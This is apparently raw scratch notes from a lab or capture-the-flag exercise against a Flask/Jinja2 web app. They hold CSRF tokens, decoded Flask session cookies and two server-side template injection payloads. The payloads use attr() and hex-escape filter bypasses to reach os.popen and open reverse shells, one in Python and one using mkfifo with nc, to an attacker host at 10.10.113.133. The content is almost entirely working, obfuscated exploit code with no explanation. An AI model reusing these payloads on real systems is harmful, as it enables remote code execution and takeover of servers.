<input id="csrf_token" name="csrf_token" type="hidden" value="ImI3ODc1NWRhZWQ4ODQ3OGU0ZjY0NDgzZDlkZWZlMTA4N2Y0ZDg2ZGUi.Y3MEJQ.stC5kdc_FwfMJyIeDpuG2-djLPg">

eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiYTk5YjFlZDQ0MjhiMWZmOTU1NDk1MjcyZTRlOTUzM2RjNzE2OTJlOCJ9.Y3MJEg.uauPwAvkh34dTvoSUe2K-vj4Ad0
eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiNTExZDU2NzhhYmM5MmZkYzYxNmEyYjYzMGNlMDFhNGEzNjdlNzZlMCJ9.Y3MJTg.jruH4JcLXggjJa-yW4aT8YNSrX8
{
  "_fresh": false,
  "csrf_token": "511d5678abc92fdc616a2b630ce01a4a367e76e0"
}

eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiOThiNmZkN2ZjMWMzZmZkZjU3YTE2MmM4ZWE3OWQwMTRjMGFjM2FkNSJ9.Y3MJIg.Jo9N5eTyXtA5D_cxFJOq_zswDmw
{
  "_fresh": false,
  "csrf_token": "98b6fd7fc1c3ffdf57a162c8ea79d014c0ac3ad5"
}

curl -c "SESSION=session-cookie" http://10.10.191.43:8080/{{request|attr('application')|attr( request|attr('args')|attr('get')('us')*2 + "globals" + request|attr('args')|attr('get')('us')*2 ) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2 )( request|attr('args')|attr('get')('us')*2 + 'builtins' + request|attr('args')|attr('get')('us')*2) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2)(request|attr('args')|attr('get')('us')*2 + 'import' + request|attr('args')|attr('get')('us')*2)('os')|attr('popen')(request|attr('args')|attr('get')('c'))|attr('read')()}}?us=_&c=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.113.133",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')
('\x72\x6d\x20\x2d\x66\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x63\x61\x74\x20\x2f\x74\x6d\x70\x2f\x66\x7c\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x20\x32\x3e\x26\x31\x7c\x6e\x63\x20\x31\x30\x2e\x31\x30\x2e\x31\x31\x33\x2e\x31\x33\x33\x20\x34\x32\x34\x32\x20\x3e\x2f\x74\x6d\x70\x2f\x66')|
attr('read')()}}
